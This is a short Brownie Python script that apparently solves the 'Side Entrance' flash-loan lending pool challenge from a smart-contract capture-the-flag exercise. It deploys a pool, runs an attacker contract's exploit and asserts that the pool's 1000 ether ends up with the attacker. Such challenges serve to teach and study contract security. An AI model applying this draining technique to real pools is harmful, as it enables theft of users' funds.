from brownie import SideEntranceLenderPool, FlashLoanEtherReceiver, accounts, Wei

ETHER_IN_POOL = 1000


def deploy():

    deployer, attacker = accounts[:2]

    pool = SideEntranceLenderPool.deploy(
        {'from': deployer, 'value': f'{ETHER_IN_POOL} ether'})

    attackerInitialEthBalance = attacker.balance()
    assert pool.balance() == Wei(f'{ETHER_IN_POOL} ether')

    return deployer, attacker, pool, attackerInitialEthBalance


def exploit(pool, attacker):
    exploit = FlashLoanEtherReceiver.deploy(pool, {'from': attacker})
    exploit.exploit({'from': attacker})


def after(attackerInitialEthBalance, pool, attacker):
    assert pool.balance() == 0
    assert attacker.balance() > attackerInitialEthBalance


def main():
    deployer, attacker, pool, attackerInitialEthBalance = deploy()

    exploit(pool, attacker)

    after(attackerInitialEthBalance, pool, attacker)
